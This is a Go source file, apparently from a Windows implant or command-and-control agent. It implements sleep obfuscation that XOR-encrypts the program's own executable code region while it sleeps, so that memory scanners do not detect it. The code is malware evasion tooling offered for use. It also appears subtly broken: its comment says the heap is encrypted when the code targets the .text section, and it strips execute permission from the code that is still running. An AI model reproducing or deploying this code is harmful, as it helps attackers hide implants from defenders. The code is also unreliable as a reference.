//go:build windows

package main

import (
	"time"
	"unsafe"
)

// sleepObf sleeps for d while XOR-encrypting the agent's own heap region.
// This is a simplified Ekko-style approach:
//   1. VirtualQuery to find current .text section base + size
//   2. XOR the region in-place with a random key
//   3. Sleep
//   4. XOR again to restore (same key = self-inverse)
//
// NOTE: Real Ekko uses ROP + timer callbacks to avoid thread creation.
// This variant uses a simpler but still effective approach.
func sleepObf(d time.Duration) {
	base, size := selfTextRegion()
	if base == 0 || size == 0 {
		time.Sleep(d)
		return
	}

	key := obfKey()

	// XOR encrypt
	xorRegion(base, size, key)

	time.Sleep(d)

	// XOR decrypt (same key)
	xorRegion(base, size, key)
}

// obfKey returns a 4-byte XOR key derived from current tick count.
func obfKey() [4]byte {
	tick, _, _ := procGetTickCount64.Call()
	return [4]byte{byte(tick), byte(tick >> 8), byte(tick >> 16), byte(tick >> 24)}
}

func xorRegion(base uintptr, size uintptr, key [4]byte) {
	var oldProtect uint32
	// Make region RW temporarily
	r, _, _ := procVirtualProtect.Call(base, size, uintptr(0x04), uintptr(unsafe.Pointer(&oldProtect)))
	if r == 0 {
		return
	}
	mem := unsafe.Slice((*byte)(unsafe.Pointer(base)), size)
	for i := range mem {
		mem[i] ^= key[i%4]
	}
	procVirtualProtect.Call(base, size, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

// MEMORY_BASIC_INFORMATION for VirtualQuery
type memBasicInfo struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

var procVirtualQuery = modKernel32.NewProc("VirtualQuery")

// selfTextRegion returns the base and size of the current module's first MEM_IMAGE RX region.
func selfTextRegion() (uintptr, uintptr) {
	hMod, _, _ := procGetModuleHandleW.Call(0) // NULL = current module
	base := hMod
	var mbi memBasicInfo
	sz := unsafe.Sizeof(mbi)

	for addr := base; ; addr += mbi.RegionSize {
		r, _, _ := procVirtualQuery.Call(addr, uintptr(unsafe.Pointer(&mbi)), sz)
		if r == 0 {
			break
		}
		// MEM_IMAGE=0x1000000, PAGE_EXECUTE_READ=0x20, MEM_COMMIT=0x1000
		if mbi.Type == 0x1000000 && mbi.State == 0x1000 &&
			(mbi.Protect == 0x20 || mbi.Protect == 0x40) {
			return mbi.BaseAddress, mbi.RegionSize
		}
		if mbi.RegionSize == 0 {
			break
		}
	}
	return 0, 0
}
